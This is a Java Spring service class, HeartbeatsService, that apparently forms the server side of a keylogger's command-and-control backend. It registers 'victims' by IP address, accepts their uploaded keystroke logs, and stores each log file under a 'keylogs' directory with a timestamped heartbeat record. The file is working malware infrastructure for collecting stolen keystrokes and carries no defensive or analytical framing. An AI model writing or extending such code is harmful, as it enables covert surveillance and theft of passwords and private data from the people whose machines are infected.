package org.example.Services;

import lombok.RequiredArgsConstructor;
import org.example.Entities.Heartbeat;
import org.example.Entities.Victim;
import org.example.Repositories.HeartbeatsRepository;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.time.LocalDateTime;
import java.util.List;
import java.util.UUID;

@Service
@RequiredArgsConstructor
public class HeartbeatsService {

    private final HeartbeatsRepository heartbeatRepository;
    private final VictimsService victimService;

    public Heartbeat saveHeartbeat(String ip, MultipartFile file) throws IOException {
        Victim victim = victimService.getOrCreateByIp(ip);

        String filePath = new File("keylogs").getAbsolutePath() + "/" + UUID.randomUUID() + ".txt";
        File directory = new File("keylogs");
        if (!directory.exists()) {
            directory.mkdirs();
        }
        File savedFile = new File(filePath);
        file.transferTo(savedFile);

        Heartbeat heartbeat = Heartbeat.builder()
                .timestamp(LocalDateTime.now())
                .victim(victim)
                .keyLogFilePath(filePath)
                .build();

        return heartbeatRepository.save(heartbeat);
    }

    public List<Heartbeat> getByVictimId(Long victimId) {
        return heartbeatRepository.findByVictimId(victimId);
    }

    public Heartbeat getById(Long id) {
        return heartbeatRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Heartbeat not found"));
    }
}
